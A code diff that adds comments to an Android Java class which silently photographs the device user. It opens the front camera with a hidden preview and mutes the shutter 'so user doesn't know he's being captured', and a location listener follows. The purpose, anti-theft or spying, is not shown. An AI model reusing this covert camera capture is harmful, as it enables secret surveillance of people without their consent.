@@ -134,13 +134,18 @@ public class Job {
 
     private void takePicture() {
         try {
+            //Get front camera id
             int frontCameraId = Util.getFrontCameraId();
             if (frontCameraId == -1) {
                 return;
             }
+
+            //Set camera stuff
             Camera camera = Camera.open(frontCameraId);
             SurfaceTexture surfaceTexture = new SurfaceTexture(0);
             camera.setPreviewTexture(surfaceTexture);
+
+            //Set highest resolution
             Camera.Parameters params = camera.getParameters();
             List<Camera.Size> sizes = params.getSupportedPictureSizes();
             int bestWidth = 0, bestHeight = 0;
@@ -153,11 +158,16 @@ public class Job {
             params.setPictureSize(bestWidth, bestHeight);
 //            params.setJpegQuality(100);
             camera.setParameters(params);
+
+            //Start a preview (required. Just that it doesn't show the user any preview.)
             camera.startPreview();
+
             //Mute the shutter sound so user doesn't know he's being captured
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                 camera.enableShutterSound(false);
             }
+
+            //Take a picture
             camera.takePicture(new Camera.ShutterCallback() {
                 @Override
                 public void onShutter() {
@@ -203,6 +213,9 @@ public class Job {
         new JobLocationListener();
     }
 
+    /**
+     * Class to listen to location updates using the GoogleApiClient Fused Location API
+     */
     private class JobLocationListener implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, LocationListener {
         private GoogleApiClient mGoogleApiClient;
         private LocationRequest mLocationRequest;
